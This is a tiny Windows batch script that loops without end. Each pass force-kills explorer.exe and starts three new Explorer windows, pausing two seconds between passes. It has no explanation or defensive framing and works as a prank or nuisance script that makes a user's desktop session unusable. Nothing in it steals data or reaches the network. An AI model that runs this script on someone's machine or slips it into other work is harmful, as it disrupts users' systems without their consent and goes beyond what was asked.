@echo off
:loop
taskkill /f /im explorer.exe
start C:\Windows\explorer.exe
start C:\Windows\explorer.exe
start C:\Windows\explorer.exe
timeout 2
goto loop
